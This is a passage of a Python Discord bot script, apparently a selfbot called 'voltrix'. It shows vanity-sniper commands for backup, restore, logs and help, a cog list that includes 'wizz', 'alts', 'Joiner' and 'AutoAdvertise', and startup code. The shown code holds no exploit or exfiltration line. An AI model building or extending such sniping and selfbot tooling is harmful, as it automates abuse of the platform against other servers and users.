        """Backup your vanity sniper settings to a separate backup JSON file."""
        await ctx.message.delete()
        backup_file = "vanity_sniper_backup.json"
        
        sniper_config = {
            "vanity_sniper": config.get("vanity_sniper", False),
            "vanities": config.get("vanities", {}),
            "vanity_delay": config.get("vanity_delay", 5),
            "vsniper_webhook": config.get("vsniper_webhook", "")
        }
        
        try:
            with open(backup_file, "w", encoding="utf-8") as f:
                json.dump(sniper_config, f, indent=4)
            await send(ctx, "Backup Success", f"📌 Backup saved as `{backup_file}`!")
        except Exception as e:
            await senderror(ctx, "Backup Failed", f"❌ Failed to save backup: `{e}`")

    @commands.command(name="vsniper_restore")
    async def vsniper_restore(self, ctx):
        """Restore your vanity sniper settings from your backup JSON file."""
        await ctx.message.delete()
        backup_file = "vanity_sniper_backup.json"
        
        if not os.path.exists(backup_file):
            return await senderror(ctx, "Restore Error", "❌ No backup file found!")
        
        try:
            with open(backup_file, "r", encoding="utf-8") as f:
                backup_data = json.load(f)
            
            config["vanity_sniper"] = backup_data.get("vanity_sniper", False)
            config["vanities"] = backup_data.get("vanities", {})
            config["vanity_delay"] = backup_data.get("vanity_delay", 5)
            config["vsniper_webhook"] = backup_data.get("vsniper_webhook", "")
            
            save_config()
            self.vanity_sniper_task.change_interval(seconds=config["vanity_delay"])
            await send(ctx, "Restore Success", "✅ Vanity Sniper settings restored from backup.")
        except Exception as e:
            await senderror(ctx, "Restore Failed", f"❌ Failed to restore: `{e}`")

    @commands.command(name="vsniper_logs")
    async def vsniper_logs(self, ctx):
        """View the latest vanity sniper claim logs."""
        await ctx.message.delete()
        logs_file = "vanity_sniper_logs.txt"
        
        if not os.path.exists(logs_file) or os.stat(logs_file).st_size == 0:
            return await senderror(ctx, "No Logs", "📌 No logs available!")
        
        try:
            with open(logs_file, "r", encoding="utf-8") as f:
                logs = f.read()
            if len(logs) > 1800:
                logs = logs[-1800:]
            await send(ctx, "Vanity Sniper Logs", f"```{logs}```")
        except Exception as e:
            await senderror(ctx, "Logs Error", f"❌ Failed to read logs: `{e}`")

    @commands.command(name="vsniper", aliases=["vanity_help"])
    async def vsniper(self, ctx):
        """Show the Vanity Sniper help menu."""
        await ctx.message.delete()
        status = "✅ Enabled" if config.get("vanity_sniper") else "❌ Disabled"
        webhook_set = "✅ Set" if config.get("vsniper_webhook") else "❌ Not set"
        vanities_count = len(config.get("vanities", {}))
        
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"**Status:** {status}\n"
            f"**Webhook:** {webhook_set}\n"
            f"**Snipes Active:** `{vanities_count}` configured\n"
            f"**Delay:** `{config.get('vanity_delay', 5)}s`\n\n"
            f"<:TOS:1336669803221614622> | **Change Vanity** **:** **`{prefix}changevanity [code]`**\n"
            f"<:TOS:1336669803221614622> | **Toggle Sniper** **:** **`{prefix}vanity_sniper [enable|disable]`**\n"
            f"<:TOS:1336669803221614622> | **Add Snipe** **:** **`{prefix}vsniper_add [vanity] [server_id]`**\n"
            f"<:TOS:1336669803221614622> | **Remove Snipe** **:** **`{prefix}vsniper_remove [vanity]`**\n"
            f"<:TOS:1336669803221614622> | **Clear Snipe List** **:** **`{prefix}vsniper_clear`**\n"
            f"<:TOS:1336669803221614622> | **Set Snipe Delay** **:** **`{prefix}vanity_delay [seconds]`**\n"
            f"<:TOS:1336669803221614622> | **List Snipe Targets** **:** **`{prefix}vanity_list`**\n"
            f"<:TOS:1336669803221614622> | **Snipe Webhook** **:** **`{prefix}vsniper_webhook [url]`**\n"
            f"<:TOS:1336669803221614622> | **Backup Sniper** **:** **`{prefix}vsniper_backup`**\n"
            f"<:TOS:1336669803221614622> | **Restore Sniper** **:** **`{prefix}vsniper_restore`**\n"
            f"<:TOS:1336669803221614622> | **View Sniper Logs** **:** **`{prefix}vsniper_logs`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Vanity Sniper Commands__<:Titanz:1281243489635405827>", description)

modules = [ServerCog,fun,images, mod, alts, nsfw,text, wizz, crypto, Wallet, check,settings, gc, vc, other,Boost,Giveaway,Joiner,AntiNuke,Greet,AliasCog,AutoAdvertise,rpc,QuestCog,VanitySniper]   

async def load_cogs():
    for cog_class in modules:
        cog = cog_class(voltrix)
        await voltrix.add_cog(cog)

    for ext_name in ['additional.extra', 'additional.extra3']:
        try:
            res = voltrix.load_extension(ext_name)
            if asyncio.iscoroutine(res):
                await res
        except Exception as e:
            print(f"[Warning] Could not load extension {ext_name}: {e}")

async def main():     
    await load_cogs()
    try:
        asyncio.create_task(start_selfapp_bot())
    except Exception as e:
        print(f"Error starting selfapp bot: {e}")
    await voltrix.start(token)

def start_bot():
    Thread(target=run_flask, daemon=True).start()
    asyncio.run(main())
    
if __name__ == "__main__":
    start_bot()
